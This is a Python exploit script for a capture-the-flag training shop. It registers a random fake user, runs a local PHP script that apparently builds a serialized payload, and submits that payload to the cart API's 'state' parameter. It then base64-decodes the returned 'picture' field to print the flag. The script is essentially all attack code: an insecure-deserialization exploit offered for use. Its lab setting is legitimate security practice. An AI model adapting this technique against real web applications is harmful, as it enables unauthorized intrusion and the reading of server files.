import requests
import string
import urllib
import random
import os
import base64

def fake_user():
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    email = username + '@gmail.com'
    return username, email

def create_session(session, username, email):
    response = session.post("http://lolshop.training.jinblack.it/api/new_session.php", data={'name': username, 'email': email})
    return response.text

# execute php scrip.php
os.system("php script.php")

serialized = open("serialization").read()

s = requests.Session()

create_session(s, *fake_user())

response = s.post("http://lolshop.training.jinblack.it/api/cart.php", data={'state': serialized})

json = response.json()

# flag is the base64 of the picture, so we need to decode it
flag = base64.b64decode(json['picture']).decode('utf-8')

print(flag)